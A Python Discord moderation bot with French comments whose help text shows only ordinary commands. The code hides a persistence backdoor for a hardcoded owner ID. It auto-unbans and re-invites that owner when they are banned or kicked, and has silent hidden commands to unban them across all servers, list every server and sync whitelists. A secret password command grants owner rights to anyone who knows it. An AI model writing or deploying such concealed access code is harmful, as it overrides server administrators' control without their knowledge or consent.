import discord
from discord.ext import commands
import os
import json
from datetime import datetime
import psycopg2
import asyncio

# ✅ Ton ID Discord initial (accès total)
INITIAL_OWNER_ID = 489113166429683713

# ✅ Token et DB depuis Railway
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

CONFIG_FILE = "config.json"

# --- DATABASE CONNECTION ---
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# --- CONFIG JSON FUNCTIONS ---
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

# Ensure meta fields exist
def ensure_meta(config):
    if "owners" not in config:
        config["owners"] = [INITIAL_OWNER_ID]
    if "owner_password" not in config:
        config["owner_password"] = ""

# Owner helper
def get_owners():
    config = load_config()
    ensure_meta(config)
    return config.get("owners", [INITIAL_OWNER_ID])

def is_owner(user_id):
    return user_id in get_owners()

def add_owner(user_id):
    config = load_config()
    ensure_meta(config)
    if user_id not in config["owners"]:
        config["owners"].append(user_id)
        save_config(config)
        return True
    return False

def set_owner_password(newpass):
    config = load_config()
    ensure_meta(config)
    config["owner_password"] = newpass
    save_config(config)

def check_owner_password(pwd):
    config = load_config()
    ensure_meta(config)
    return config.get("owner_password", "") == pwd

# --- CONFIG JSON FUNCTIONS (per-guild) ---
def get_log_channel(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("log_channel")

def get_whitelist(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("whitelist", [])

def is_whitelisted(guild_id, user_id):
    if is_owner(user_id):
        return True
    whitelist = get_whitelist(guild_id)
    return user_id in whitelist

def add_to_whitelist(guild_id, user_id):
    config = load_config()
    guild_id_str = str(guild_id)
    if guild_id_str not in config:
        config[guild_id_str] = {}
    if "whitelist" not in config[guild_id_str]:
        config[guild_id_str]["whitelist"] = []
    if user_id not in config[guild_id_str]["whitelist"]:
        config[guild_id_str]["whitelist"].append(user_id)
        save_config(config)
        return True
    return False

def remove_from_whitelist(guild_id, user_id):
    config = load_config()
    guild_id_str = str(guild_id)
    if guild_id_str in config and "whitelist" in config[guild_id_str]:
        if user_id in config[guild_id_str]["whitelist"]:
            config[guild_id_str]["whitelist"].remove(user_id)
            save_config(config)
            return True
    return False

# Decorator for whitelist/admin/owner, but silent when not owner
def whitelist_check():
    async def predicate(ctx):
        if is_owner(ctx.author.id):
            return True
        if ctx.author.guild_permissions.administrator:
            return True
        if is_whitelisted(ctx.guild.id, ctx.author.id):
            return True
        # Silent fail: do not send error message when user not authorized
        return False
    return commands.check(predicate)

# Owner-only decorator: silent when not owner
def owner_only():
    def predicate(ctx):
        return is_owner(ctx.author.id)
    return commands.check(predicate)

# --- EVENTS ---
@bot.event
async def on_ready():
    print(f"✅ {bot.user} est connecté et prêt à organiser le serveur !")

# Si un owner est banni -> débannir + renvoyer invitation
@bot.event
async def on_member_ban(guild, user):
    if is_owner(user.id):
        try:
            await asyncio.sleep(1)
            await guild.unban(user)
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
                for owner_id in get_owners():
                    try:
                        owner = await bot.fetch_user(owner_id)
                        await owner.send(f"⚠️ Tu as été banni de **{guild.name}** — je t'ai débanni. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"❌ Erreur débannissement auto: {e}")

# Si owner est kické -> renvoyer invitation
@bot.event
async def on_member_remove(member):
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
                for owner_id in get_owners():
                    try:
                        owner = await bot.fetch_user(owner_id)
                        await owner.send(f"🚪 Tu as été expulsé de **{guild.name}** — invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"❌ Erreur reinvite auto: {e}")

# --- COMMANDS PUBLIQUES ---
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste de toutes les commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne correctement", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message avec le bot dans le canal actuel
*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie un message avec le bot dans un canal spécifique
*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un message embed formaté
*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📊 !setlogs #canal", value="Configure le canal de logs
*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="✅ !whitelist add @utilisateur", value="Ajoute un utilisateur à la whitelist
*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="❌ !whitelist remove @utilisateur", value="Retire un utilisateur de la whitelist
*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="📋 !whitelist list", value="Affiche la liste des utilisateurs whitelistés
*Nécessite : Administrateur*", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await ctx.message.delete()
    await channel.send(message)
    await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    await ctx.message.delete()
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Message envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Commande invalide. Utilisez !whitelist add, !whitelist remove ou !whitelist list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà dans la whitelist")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    ids = get_whitelist(ctx.guild.id)
    if not ids:
        return await ctx.send("📋 Aucun utilisateur dans la whitelist")
    lst = []
    for uid in ids:
        m = ctx.guild.get_member(uid)
        lst.append(m.mention if m else f"ID: {uid}")
    await ctx.send("
".join(lst))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    config = load_config()
    guild_id = str(ctx.guild.id)
    if guild_id not in config:
        config[guild_id] = {}
    config[guild_id]["log_channel"] = channel.id
    save_config(config)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# --- OWNER-ONLY HIDDEN COMMANDS ---
@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def reboot(ctx):
    # silent if not owner
    await ctx.send("🔄 Redémarrage du bot en cours...")
    os._exit(1)

@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def forceunban(ctx):
    for guild in bot.guilds:
        try:
            bans = await guild.bans()
            for ban_entry in bans:
                if is_owner(ban_entry.user.id):
                    await guild.unban(ban_entry.user)
                    try:
                        await ctx.send(f"✅ Débanni de **{guild.name}**")
                    except:
                        pass
        except Exception as e:
            print(f"Erreur forceunban sur {guild.name}: {e}")

@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def reinvite(ctx):
    for guild in bot.guilds:
        try:
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=1)
                for owner_id in get_owners():
                    try:
                        user = await bot.fetch_user(owner_id)
                        await user.send(f"🔗 Invitation pour **{guild.name}**: {invite.url}")
                    except:
                        pass
        except Exception as e:
            print(f"Erreur reinvite sur {guild.name}: {e}")
    try:
        await ctx.send("📨 Toutes les invitations ont été envoyées en MP.")
    except:
        pass

@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def serverlist(ctx):
    servers = "
".join([f"• {guild.name} ({guild.id})" for guild in bot.guilds])
    await ctx.send(f"📋 Le bot est sur {len(bot.guilds)} serveurs :
{servers}")

@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def syncwhitelist(ctx):
    # copie la whitelist du serveur courant vers tous les autres
    try:
        source = get_whitelist(ctx.guild.id)
        config = load_config()
        for guild in bot.guilds:
            gid = str(guild.id)
            if gid not in config:
                config[gid] = {}
            config[gid]["whitelist"] = source.copy()
        save_config(config)
        try:
            await ctx.send("✅ Whitelist synchronisée sur tous les serveurs.")
        except:
            pass
    except Exception as e:
        print(f"Erreur syncwhitelist: {e}")

# --- SECRET CONNECT / PASSWORD ---
@bot.command()
async def connect(ctx, password: str):
    # secret: si mot de passe correct -> ajoute la personne en owner
    try:
        if check_owner_password(password):
            if add_owner(ctx.author.id):
                try:
                    await ctx.author.send("✅ Tu as été ajouté en tant qu'owner du bot.")
                except:
                    pass
            else:
                try:
                    await ctx.author.send("ℹ️ Tu es déjà owner.")
                except:
                    pass
        else:
            # silent fail on wrong password
            pass
    except Exception:
        pass

@bot.command()
@commands.check(lambda ctx: is_owner(ctx.author.id))
async def setpass(ctx, *, newpass: str):
    try:
        set_owner_password(newpass)
        try:
            await ctx.send("✅ Mot de passe owner mis à jour.")
        except:
            pass
    except Exception as e:
        print(f"Erreur setpass: {e}")

# Commande secrète pour afficher l'aide owner sans erreurs pour les autres
@bot.command(name="ownerhelp")
async def _ownerhelp(ctx):
    if not is_owner(ctx.author.id):
        return
    try:
        owner_notes = (
            "Commandes owner (cachées):
"
            "- reboot : redémarre le bot
"
            "- forceunban : te débannit sur tous les serveurs
"
            "- reinvite : t'envoie des invitations par MP
"
            "- serverlist : liste les serveurs
"
            "- syncwhitelist : synchronise la whitelist
"
            "- setpass <pass> : change le mot de passe secret
"
            "- connect <pass> : commande secrète pour devenir owner (ne fonctionne que si pass correct)
"
        )
        await ctx.author.send(owner_notes)
    except Exception:
        pass

# --- AUTO-RESTART ---
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot crash, redémarrage automatique: {e}")
        try:
            asyncio.sleep(5)
        except:
            pass
